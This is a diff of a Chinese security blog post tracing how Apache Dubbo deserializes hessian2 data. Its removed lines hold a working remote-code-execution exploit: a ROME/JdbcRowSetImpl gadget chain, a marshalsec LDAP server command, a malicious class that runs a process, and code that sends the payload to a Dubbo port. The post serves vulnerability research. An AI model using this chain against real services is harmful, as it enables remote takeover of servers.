@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="反序列化,dubbo,hessian2,dubbo协议,">
+  <meta name="keywords" content="dubbo,反序列化,hessian2,dubbo协议,">
 
 
 
@@ -80,14 +80,14 @@
 
 
 <meta name="description" content="一、前言官方github描述：1Apache Dubbo is a high-performance, java based, open source RPC framework. Apache Dubbo是一款高性能、轻量级的开源Java RPC框架，它提供了三大核心能力：面向接口的远程方法调用，智能容错和负载均衡，以及服务自动注册和发现。">
-<meta name="keywords" content="反序列化,dubbo,hessian2,dubbo协议">
+<meta name="keywords" content="dubbo,反序列化,hessian2,dubbo协议">
 <meta property="og:type" content="article">
 <meta property="og:title" content="dubbo源码浅析-默认dubbo协议反序列化利用之hessian2">
 <meta property="og:url" content="http://yoursite.com/2020/02/14/dubbo源码浅析-默认dubbo协议反序列化利用之hessian2/index.html">
 <meta property="og:site_name" content="大彩笔threedr3am">
 <meta property="og:description" content="一、前言官方github描述：1Apache Dubbo is a high-performance, java based, open source RPC framework. Apache Dubbo是一款高性能、轻量级的开源Java RPC框架，它提供了三大核心能力：面向接口的远程方法调用，智能容错和负载均衡，以及服务自动注册和发现。">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2020-06-12T14:25:41.188Z">
+<meta property="og:updated_time" content="2020-09-15T09:44:48.172Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="dubbo源码浅析-默认dubbo协议反序列化利用之hessian2">
 <meta name="twitter:description" content="一、前言官方github描述：1Apache Dubbo is a high-performance, java based, open source RPC framework. Apache Dubbo是一款高性能、轻量级的开源Java RPC框架，它提供了三大核心能力：面向接口的远程方法调用，智能容错和负载均衡，以及服务自动注册和发现。">
@@ -137,7 +137,7 @@
     var _hmt = _hmt || [];
     (function() {
       var hm = document.createElement("script");
-      hm.src = "https://hm.baidu.com/hm.js?8346bb07e7843cd10a2ee33017b3d627";
+      hm.src = "https://hm.baidu.com/hm.js?ba63af2f58310d7562bd4ddbdaa7c548";
       var s = document.getElementsByTagName("script")[0];
       s.parentNode.insertBefore(hm, s);
     })();
@@ -550,158 +550,51 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">case 0x60:</span><br><span class="line">case 0x61:</span><br><span class="line">case 0x62:</span><br><span class="line">case 0x63:</span><br><span class="line">case 0x64:</span><br><span class="line">case 0x65:</span><br><span class="line">case 0x66:</span><br><span class="line">case 0x67:</span><br><span class="line">case 0x68:</span><br><span class="line">case 0x69:</span><br><span class="line">case 0x6a:</span><br><span class="line">case 0x6b:</span><br><span class="line">case 0x6c:</span><br><span class="line">case 0x6d:</span><br><span class="line">case 0x6e:</span><br><span class="line">case 0x6f: &#123;</span><br><span class="line">    int ref = tag - 0x60;</span><br><span class="line">    int size = _classDefs.size();</span><br><span class="line"></span><br><span class="line">    if (ref &lt; 0 || size &lt;= ref)</span><br><span class="line">        throw new HessianProtocolException(&quot;&apos;&quot; + ref + &quot;&apos; is an unknown class definition&quot;);</span><br><span class="line"></span><br><span class="line">    ObjectDefinition def = (ObjectDefinition) _classDefs.get(ref);</span><br><span class="line"></span><br><span class="line">    return readObjectInstance(expectedClass, def);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>进行实例的反序列化</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">private Object readObjectInstance(Class cl, ObjectDefinition def)</span><br><span class="line">        throws IOException &#123;</span><br><span class="line">    String type = def.getType();</span><br><span class="line">    String[] fieldNames = def.getFieldNames();</span><br><span class="line"></span><br><span class="line">    if (cl != null) &#123;</span><br><span class="line">        Deserializer reader;</span><br><span class="line">        reader = findSerializerFactory().getObjectDeserializer(type, cl);</span><br><span class="line"></span><br><span class="line">        return reader.readObject(this, fieldNames);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        return findSerializerFactory().readObject(this, type, fieldNames);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>可以看到<figure class="highlight plain"><figcaption><span>type </span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">因为反序列化的是java类，因此，Deserializer的实现为com.alibaba.com.caucho.hessian.io.JavaDeserializer，跟进其构造方法，可以看到：</span><br></pre></td></tr></table></figure></p>
-<p>public JavaDeserializer(Class cl) {<br>    _type = cl;<br>    _fieldMap = getFieldMap(cl);</p>
-<pre><code>_readResolve = getReadResolve(cl);
-
-if (_readResolve != null) {
-    _readResolve.setAccessible(true);
-}
-
-Constructor[] constructors = cl.getDeclaredConstructors();
-long bestCost = Long.MAX_VALUE;
-
-for (int i = 0; i &lt; constructors.length; i++) {
-    Class[] param = constructors[i].getParameterTypes();
-    long cost = 0;
-
-    for (int j = 0; j &lt; param.length; j++) {
-        cost = 4 * cost;
-
-        if (Object.class.equals(param[j]))
-            cost += 1;
-        else if (String.class.equals(param[j]))
-            cost += 2;
-        else if (int.class.equals(param[j]))
-            cost += 3;
-        else if (long.class.equals(param[j]))
-            cost += 4;
-        else if (param[j].isPrimitive())
-            cost += 5;
-        else
-            cost += 6;
-    }
-
-    if (cost &lt; 0 || cost &gt; (1 &lt;&lt; 48))
-        cost = 1 &lt;&lt; 48;
-
-    cost += (long) param.length &lt;&lt; 48;
-
-    if (cost &lt; bestCost) {
-        _constructor = constructors[i];
-        bestCost = cost;
-    }
-}
-
-if (_constructor != null) {
-    _constructor.setAccessible(true);
-    Class[] params = _constructor.getParameterTypes();
-    _constructorArgs = new Object[params.length];
-    for (int i = 0; i &lt; params.length; i++) {
-        _constructorArgs[i] = getParamArg(params[i]);
-    }
-}
-</code></pre><p>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">可以看到，构造方法的选择，只选择花销最小并且只有基本类型传入的构造方法，而这，就是hessian2反序列化中最大的限制。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">最终执行其reader.readObject(this, fieldNames)方法，完成类的反射方式实例化</span><br></pre></td></tr></table></figure></p>
-<p>@Override<br>public Object readObject(AbstractHessianInput in, String[] fieldNames)<br>        throws IOException {<br>    try {<br>        Object obj = instantiate();</p>
-<pre><code>    return readObject(in, obj, fieldNames);
-} catch (IOException e) {
-    throw e;
-} catch (RuntimeException e) {
-    throw e;
-} catch (Exception e) {
-    throw new IOExceptionWrapper(_type.getName() + &quot;:&quot; + e.getMessage(), e);
-}
-</code></pre><p>}</p>
-<p>protected Object instantiate()<br>        throws Exception {<br>    try {<br>        if (_constructor != null)<br>            return _constructor.newInstance(_constructorArgs);<br>        else<br>            return _type.newInstance();<br>    } catch (Exception e) {<br>        throw new HessianProtocolException(“‘“ + _type.getName() + “‘ could not be instantiated”, e);<br>    }<br>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">并在实例化后，把字段值设置进去</span><br></pre></td></tr></table></figure></p>
-<p>public Object readObject(AbstractHessianInput in,<br>                         Object obj,<br>                         String[] fieldNames)<br>        throws IOException {<br>    try {<br>        int ref = in.addRef(obj);</p>
-<pre><code>    for (int i = 0; i &lt; fieldNames.length; i++) {
-        String name = fieldNames[i];
-
-        FieldDeserializer deser = (FieldDeserializer) _fieldMap.get(name);
-
-        if (deser != null)
-            deser.deserialize(in, obj);
-        else
-            in.readObject();
-    }
-
-    Object resolve = resolve(obj);
-
-    if (obj != resolve)
-        in.setRef(ref, resolve);
-
-    return resolve;
-} catch (IOException e) {
-    throw e;
-} catch (Exception e) {
-    throw new IOExceptionWrapper(obj.getClass().getName() + &quot;:&quot; + e, e);
-}
-</code></pre><p>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">### 四、反序列化利用(hessian2)</span><br><span class="line"></span><br><span class="line">在上一节中，详细的描述了dubbo默认的hessian2反序列化，通过上一节，我们也清楚的理解了hessian2的反序列化大概源码执行流程，以及其反序列化攻击的利用限制。</span><br><span class="line"></span><br><span class="line">对其整理一下：</span><br><span class="line">1. 默认dubbo协议+hessian2序列化方式</span><br><span class="line">2. 序列化tcp包可随意修改方法参数反序列化的class</span><br><span class="line">3. 反序列化时先通过构造方法实例化，然后在反射设置字段值</span><br><span class="line">4. 构造方法的选择，只选择花销最小并且只有基本类型传入的构造方法</span><br><span class="line"></span><br><span class="line">由此，想要rce，估计得找到以下条件的gadget clain：</span><br><span class="line">1. 有参构造方法</span><br><span class="line">2. 参数不包含非基本类型</span><br><span class="line">3. cost最小的构造方法并且全部都是基本类型或String</span><br><span class="line"></span><br><span class="line">这样的利用条件太苛刻了，不过万事没绝对，参考marshalsec，可以利用rome依赖使用HashMap触发key的hashCode方法的gadget chain来打，以下是对hessian2反序列化map的源码跟踪：</span><br></pre></td></tr></table></figure></p>
-<p>@Override<br>@SuppressWarnings(“unchecked”)<br>public <t> T readObject(Class<t> cls) throws IOException,<br>        ClassNotFoundException {<br>    return (T) mH2i.readObject(cls);<br>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-&gt;</span><br></pre></td></tr></table></figure></t></t></p>
-<p>@Override<br>public Object readObject(Class cl)<br>        throws IOException {<br>    return readObject(cl, null, null);<br>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-&gt;</span><br></pre></td></tr></table></figure></p>
-<p>@Override<br>public Object readObject(Class expectedClass, Class&lt;?&gt;… expectedTypes) throws IOException {<br>    //…<br>    switch (tag) {<br>        //…<br>        case ‘H’: {<br>            Deserializer reader = findSerializerFactory().getDeserializer(expectedClass);</p>
-<pre><code>        boolean keyValuePair = expectedTypes != null &amp;&amp; expectedTypes.length == 2;
-        // fix deserialize of short type
-        return reader.readMap(this
-                , keyValuePair ? expectedTypes[0] : null
-                , keyValuePair ? expectedTypes[1] : null);
-    }
-    //...    
-}
-</code></pre><p>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-&gt;</span><br></pre></td></tr></table></figure></p>
-<p>@Override<br>public Object readMap(AbstractHessianInput in, Class&lt;?&gt; expectKeyType, Class&lt;?&gt; expectValueType) throws IOException {<br>    Map map;</p>
-<pre><code>if (_type == null)
-    map = new HashMap();
-else if (_type.equals(Map.class))
-    map = new HashMap();
-else if (_type.equals(SortedMap.class))
-    map = new TreeMap();
-else {
-    try {
-        map = (Map) _ctor.newInstance();
-    } catch (Exception e) {
-        throw new IOExceptionWrapper(e);
-    }
-}
-
-in.addRef(map);
-
-doReadMap(in, map, expectKeyType, expectValueType);
-
-in.readEnd();
-
-return map;
-</code></pre><p>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-&gt;</span><br></pre></td></tr></table></figure></p>
-<p>protected void doReadMap(AbstractHessianInput in, Map map, Class&lt;?&gt; keyType, Class&lt;?&gt; valueType) throws IOException {<br>    Deserializer keyDeserializer = null, valueDeserializer = null;</p>
-<pre><code>SerializerFactory factory = findSerializerFactory(in);
-if(keyType != null){
-    keyDeserializer = factory.getDeserializer(keyType.getName());
-}
-if(valueType != null){
-    valueDeserializer = factory.getDeserializer(valueType.getName());
-}
-
-while (!in.isEnd()) {
-    map.put(keyDeserializer != null ? keyDeserializer.readObject(in) : in.readObject(),
-            valueDeserializer != null? valueDeserializer.readObject(in) : in.readObject());
-}
-</code></pre><p>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">从上面贴出来的部分执行栈信息，可以清晰的看到，最终在反序列化中实例化了新的HashMap，然后把反序列化出来的实例put进去，因此，会触发key的hashCode方法。</span><br><span class="line"></span><br><span class="line">创建gadget chain：</span><br><span class="line"></span><br><span class="line">- 具有rome依赖的gadget chain</span><br><span class="line"></span><br><span class="line">依赖</span><br></pre></td></tr></table></figure></p>
-<p><dependency><br>  <groupid>com.rometools</groupid><br>  <artifactid>rome</artifactid><br>  <version>1.7.0</version><br></dependency><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">创建恶意class，放到http服务器（80端口）</span><br></pre></td></tr></table></figure></p>
-<p>public class ExecObject {<br>    static {<br>        try {<br>            Runtime.getRuntime().exec(“/System/Applications/Calculator.app/Contents/MacOS/Calculator”);<br>        } catch (IOException e) {<br>            e.printStackTrace();<br>        }<br>    }<br>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">启动ldap服务</span><br></pre></td></tr></table></figure></p>
-<p>java -jar marshalsec.jar marshalsec.jndi.LDAPRefServer <a href="http://127.0.0.1:80/#ExecObject" target="_blank" rel="noopener">http://127.0.0.1:80/#ExecObject</a> 44321<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">构造payload</span><br></pre></td></tr></table></figure></p>
-<p>JdbcRowSetImpl rs = new JdbcRowSetImpl();<br>//todo 此处填写ldap url<br>rs.setDataSourceName(“ldap://127.0.0.1:43658/ExecObject”);<br>rs.setMatchColumn(“foo”);<br>Reflections.getField(javax.sql.rowset.BaseRowSet.class, “listeners”).set(rs, null);</p>
-<p>ToStringBean item = new ToStringBean(JdbcRowSetImpl.class, rs);<br>EqualsBean root = new EqualsBean(ToStringBean.class, item);</p>
-<p>HashMap s = new HashMap&lt;&gt;();<br>Reflections.setFieldValue(s, “size”, 2);<br>Class&lt;?&gt; nodeC;<br>try {<br>  nodeC = Class.forName(“java.util.HashMap$Node”);<br>}<br>catch ( ClassNotFoundException e ) {<br>  nodeC = Class.forName(“java.util.HashMap$Entry”);<br>}<br>Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);<br>nodeCons.setAccessible(true);</p>
-<p>Object tbl = Array.newInstance(nodeC, 2);<br>Array.set(tbl, 0, nodeCons.newInstance(0, root, root, null));<br>Array.set(tbl, 1, nodeCons.newInstance(0, root, root, null));<br>Reflections.setFieldValue(s, “table”, tbl);</p>
-<p>ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();</p>
-<p>// header.<br>byte[] header = new byte[16];<br>// set magic number.<br>Bytes.short2bytes((short) 0xdabb, header);<br>// set request and serialization flag.<br>header[2] = (byte) ((byte) 0x80 | 2);</p>
-<p>// set request id.<br>Bytes.long2bytes(new Random().nextInt(100000000), header, 4);</p>
-<p>ByteArrayOutputStream hessian2ByteArrayOutputStream = new ByteArrayOutputStream();<br>Hessian2ObjectOutput out = new Hessian2ObjectOutput(hessian2ByteArrayOutputStream);</p>
-<p>out.writeUTF(“2.0.2”);<br>//todo 此处填写注册中心获取到的service全限定名、版本号、方法名<br>out.writeUTF(“com.threedr3am.learn.server.boot.DemoService”);<br>out.writeUTF(“1.0”);<br>out.writeUTF(“hello”);<br>//todo 方法描述不需要修改，因为此处需要指定map的payload去触发<br>out.writeUTF(“Ljava/util/Map;”);<br>out.writeObject(s);<br>out.writeObject(new HashMap());</p>
-<p>out.flushBuffer();<br>if (out instanceof Cleanable) {<br>  ((Cleanable) out).cleanup();<br>}</p>
-<p>Bytes.int2bytes(hessian2ByteArrayOutputStream.size(), header, 12);<br>byteArrayOutputStream.write(header);<br>byteArrayOutputStream.write(hessian2ByteArrayOutputStream.toByteArray());</p>
-<p>byte[] bytes = byteArrayOutputStream.toByteArray();</p>
-<p>//todo 此处填写被攻击的dubbo服务提供者地址和端口<br>Socket socket = new Socket(“127.0.0.1”, 20880);<br>OutputStream outputStream = socket.getOutputStream();<br>outputStream.write(bytes);<br>outputStream.flush();<br>outputStream.close();<br><code>`</code></p>
+<p>可以看到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String type = def.getType();</span><br></pre></td></tr></table></figure></p>
+<p>读取了类定义，接着<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String[] fieldNames = def.getFieldNames();</span><br></pre></td></tr></table></figure></p>
+<p>读取了类字段集合</p>
+<p>因为反序列化的是java类，因此，Deserializer的实现为com.alibaba.com.caucho.hessian.io.JavaDeserializer，跟进其构造方法，可以看到：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">public JavaDeserializer(Class cl) &#123;</span><br><span class="line">    _type = cl;</span><br><span class="line">    _fieldMap = getFieldMap(cl);</span><br><span class="line"></span><br><span class="line">    _readResolve = getReadResolve(cl);</span><br><span class="line"></span><br><span class="line">    if (_readResolve != null) &#123;</span><br><span class="line">        _readResolve.setAccessible(true);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Constructor[] constructors = cl.getDeclaredConstructors();</span><br><span class="line">    long bestCost = Long.MAX_VALUE;</span><br><span class="line"></span><br><span class="line">    for (int i = 0; i &lt; constructors.length; i++) &#123;</span><br><span class="line">        Class[] param = constructors[i].getParameterTypes();</span><br><span class="line">        long cost = 0;</span><br><span class="line"></span><br><span class="line">        for (int j = 0; j &lt; param.length; j++) &#123;</span><br><span class="line">            cost = 4 * cost;</span><br><span class="line"></span><br><span class="line">            if (Object.class.equals(param[j]))</span><br><span class="line">                cost += 1;</span><br><span class="line">            else if (String.class.equals(param[j]))</span><br><span class="line">                cost += 2;</span><br><span class="line">            else if (int.class.equals(param[j]))</span><br><span class="line">                cost += 3;</span><br><span class="line">            else if (long.class.equals(param[j]))</span><br><span class="line">                cost += 4;</span><br><span class="line">            else if (param[j].isPrimitive())</span><br><span class="line">                cost += 5;</span><br><span class="line">            else</span><br><span class="line">                cost += 6;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (cost &lt; 0 || cost &gt; (1 &lt;&lt; 48))</span><br><span class="line">            cost = 1 &lt;&lt; 48;</span><br><span class="line"></span><br><span class="line">        cost += (long) param.length &lt;&lt; 48;</span><br><span class="line"></span><br><span class="line">        if (cost &lt; bestCost) &#123;</span><br><span class="line">            _constructor = constructors[i];</span><br><span class="line">            bestCost = cost;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (_constructor != null) &#123;</span><br><span class="line">        _constructor.setAccessible(true);</span><br><span class="line">        Class[] params = _constructor.getParameterTypes();</span><br><span class="line">        _constructorArgs = new Object[params.length];</span><br><span class="line">        for (int i = 0; i &lt; params.length; i++) &#123;</span><br><span class="line">            _constructorArgs[i] = getParamArg(params[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到，构造方法的选择，只选择花销最小并且只有基本类型传入的构造方法，而这，就是hessian2反序列化中最大的限制。</p>
+<p>最终执行其reader.readObject(this, fieldNames)方法，完成类的反射方式实例化</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">@Override</span><br><span class="line">public Object readObject(AbstractHessianInput in, String[] fieldNames)</span><br><span class="line">        throws IOException &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        Object obj = instantiate();</span><br><span class="line"></span><br><span class="line">        return readObject(in, obj, fieldNames);</span><br><span class="line">    &#125; catch (IOException e) &#123;</span><br><span class="line">        throw e;</span><br><span class="line">    &#125; catch (RuntimeException e) &#123;</span><br><span class="line">        throw e;</span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line">        throw new IOExceptionWrapper(_type.getName() + &quot;:&quot; + e.getMessage(), e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">protected Object instantiate()</span><br><span class="line">        throws Exception &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        if (_constructor != null)</span><br><span class="line">            return _constructor.newInstance(_constructorArgs);</span><br><span class="line">        else</span><br><span class="line">            return _type.newInstance();</span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line">        throw new HessianProtocolException(&quot;&apos;&quot; + _type.getName() + &quot;&apos; could not be instantiated&quot;, e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>并在实例化后，把字段值设置进去</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">public Object readObject(AbstractHessianInput in,</span><br><span class="line">                         Object obj,</span><br><span class="line">                         String[] fieldNames)</span><br><span class="line">        throws IOException &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        int ref = in.addRef(obj);</span><br><span class="line"></span><br><span class="line">        for (int i = 0; i &lt; fieldNames.length; i++) &#123;</span><br><span class="line">            String name = fieldNames[i];</span><br><span class="line"></span><br><span class="line">            FieldDeserializer deser = (FieldDeserializer) _fieldMap.get(name);</span><br><span class="line"></span><br><span class="line">            if (deser != null)</span><br><span class="line">                deser.deserialize(in, obj);</span><br><span class="line">            else</span><br><span class="line">                in.readObject();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Object resolve = resolve(obj);</span><br><span class="line"></span><br><span class="line">        if (obj != resolve)</span><br><span class="line">            in.setRef(ref, resolve);</span><br><span class="line"></span><br><span class="line">        return resolve;</span><br><span class="line">    &#125; catch (IOException e) &#123;</span><br><span class="line">        throw e;</span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line">        throw new IOExceptionWrapper(obj.getClass().getName() + &quot;:&quot; + e, e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="四、反序列化利用-hessian2"><a href="#四、反序列化利用-hessian2" class="headerlink" title="四、反序列化利用(hessian2)"></a>四、反序列化利用(hessian2)</h3><p>在上一节中，详细的描述了dubbo默认的hessian2反序列化，通过上一节，我们也清楚的理解了hessian2的反序列化大概源码执行流程，以及其反序列化攻击的利用限制。</p>
+<p>对其整理一下：</p>
+<ol>
+<li>默认dubbo协议+hessian2序列化方式</li>
+<li>序列化tcp包可随意修改方法参数反序列化的class</li>
+<li>反序列化时先通过构造方法实例化，然后在反射设置字段值</li>
+<li>构造方法的选择，只选择花销最小并且只有基本类型传入的构造方法</li>
+</ol>
+<p>由此，想要rce，估计得找到以下条件的gadget clain：</p>
+<ol>
+<li>有参构造方法</li>
+<li>参数不包含非基本类型</li>
+<li>cost最小的构造方法并且全部都是基本类型或String</li>
+</ol>
+<p>这样的利用条件太苛刻了，不过万事没绝对，参考marshalsec，可以利用rome依赖使用HashMap触发key的hashCode方法的gadget chain来打，以下是对hessian2反序列化map的源码跟踪：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">@Override</span><br><span class="line">@SuppressWarnings(&quot;unchecked&quot;)</span><br><span class="line">public &lt;T&gt; T readObject(Class&lt;T&gt; cls) throws IOException,</span><br><span class="line">        ClassNotFoundException &#123;</span><br><span class="line">    return (T) mH2i.readObject(cls);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>-&gt;</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@Override</span><br><span class="line">public Object readObject(Class cl)</span><br><span class="line">        throws IOException &#123;</span><br><span class="line">    return readObject(cl, null, null);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>-&gt;<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">@Override</span><br><span class="line">public Object readObject(Class expectedClass, Class&lt;?&gt;... expectedTypes) throws IOException &#123;</span><br><span class="line">    //...</span><br><span class="line">    switch (tag) &#123;</span><br><span class="line">        //...</span><br><span class="line">        case &apos;H&apos;: &#123;</span><br><span class="line">            Deserializer reader = findSerializerFactory().getDeserializer(expectedClass);</span><br><span class="line"></span><br><span class="line">            boolean keyValuePair = expectedTypes != null &amp;&amp; expectedTypes.length == 2;</span><br><span class="line">            // fix deserialize of short type</span><br><span class="line">            return reader.readMap(this</span><br><span class="line">                    , keyValuePair ? expectedTypes[0] : null</span><br><span class="line">                    , keyValuePair ? expectedTypes[1] : null);</span><br><span class="line">        &#125;</span><br><span class="line">        //...    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>-&gt;</p>
